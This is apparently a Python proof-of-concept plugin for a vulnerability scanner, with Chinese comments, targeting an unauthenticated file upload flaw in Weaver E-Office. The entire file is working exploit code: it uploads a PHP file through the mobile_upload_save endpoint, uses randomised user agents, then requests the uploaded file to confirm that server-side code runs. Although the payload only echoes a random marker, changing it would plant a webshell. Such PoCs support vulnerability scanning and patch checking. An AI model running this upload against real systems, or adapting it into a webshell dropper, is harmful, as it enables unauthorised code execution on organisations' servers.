# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua,random_str
from lib.core.poc import POCBase
import re
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2022-1-10",        # POC创建时间
        "UpdateDate" : "2022-1-10",        # POC创建时间
        "PocDesc" : """

        """,                                # POC描述，写更新描述，没有就不写

        "name" : "泛微E-Office存在前台文件上传漏洞" ,                  # 漏洞名称
        "VulnID" : "",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "泛微 E-Office",                     # 漏洞应用名称
        "AppVersion" : "无",                  # 漏洞应用版本
        "VulnDate" : "2021-03-10",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
        
        """ ,                          # 漏洞简要描述

        "fofa-dork":"" , """

        """                   # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  

    }

    timeout = 10

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url0 = self.target + "/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save" # url0自己按需调整

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "multipart/form-data; boundary=12f83ada5e3c205e29da579b538944ff",
                    }
        flag = random_str()
        data = """
--12f83ada5e3c205e29da579b538944ff
Content-Disposition: form-data; name="upload_quwan"; filename="test.php4"
Content-Type: application/octet-stream

<?php echo "{flag}";?>
--12f83ada5e3c205e29da579b538944ff
""".format(flag=flag)
        try:
            """
            检测逻辑，漏洞存在则修改vuln值，漏洞不存在则不动
            """
            req0 = requests.post(url0,headers = headers , data = data, proxies = self.proxy , timeout = self.timeout,verify = False)
            reg = """\[\d,".+",\d+.".+.php4"]"""
            result = re.match(reg,req0.text.strip())
            if req0.status_code == 200 and result :
                urls = result.group()[1:-1].split(",")
                dic1 = urls[2].strip("\"")
                dic2 = urls[3].strip("\"")
                url1 = self.target + "/attachment//" + dic1 + "//" + dic2
                req1 = requests.get(url1,headers = headers , proxies = self.proxy , timeout = self.timeout,verify = False)
                if req1.status_code == 200 and flag in req1.text:
                    vuln = [True,req1.text]
            else:
                vuln = [False,req0.text]
        except Exception as e:
            raise e

        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()